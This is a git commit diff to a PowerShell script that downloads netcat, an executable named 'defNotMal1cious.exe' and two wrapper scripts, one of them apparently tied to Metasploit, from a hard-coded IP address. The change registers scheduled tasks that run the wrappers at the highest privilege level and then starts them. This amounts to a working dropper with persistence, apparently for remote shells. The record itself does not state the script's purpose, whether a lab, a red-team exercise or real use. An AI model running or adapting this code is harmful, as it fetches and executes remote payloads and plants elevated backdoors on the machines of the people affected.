741c39172596fa3a8bb713fa964ab798b5921042
soupsamich <66322946+soupsamich@users.noreply.github.com>
2020-06-27 15:31:09 -0400

    Update windowsScript.ps1

--- windowsScript.ps1
+++ windowsScript.ps1
@@ -3,5 +3,9 @@ Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFi
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMalicious.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.ps1 -OutFile C:/windowsWrapperMSF.ps1;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.ps1 -OutFile C:/windowsWrapperNC.ps1;
-Start-Job -ScriptBlock {C:/windowsWrapperMSF.ps1};
-Start-Job -ScriptBlock {C:/windowsWrapperNC.ps1};
+$Action2=New-ScheduledTaskAction -Execute PowerShell.exe -WorkingDirectory C:/ -Argument “C:\windowsWrapperMSF.ps1"
+Register-ScheduledTask -TaskName "windowsMSF" -Action $Action2 -RunLevel Highest
+$Action1=New-ScheduledTaskAction -Execute PowerShell.exe -WorkingDirectory C:/ -Argument “C:\windowsWrapperNC.ps1"
+Register-ScheduledTask -TaskName "windowsNC" -Action $Action1 -RunLevel Highest
+schtasks.exe /run /tn windowsNC
+schtasks.exe /run /tn windowsMSF
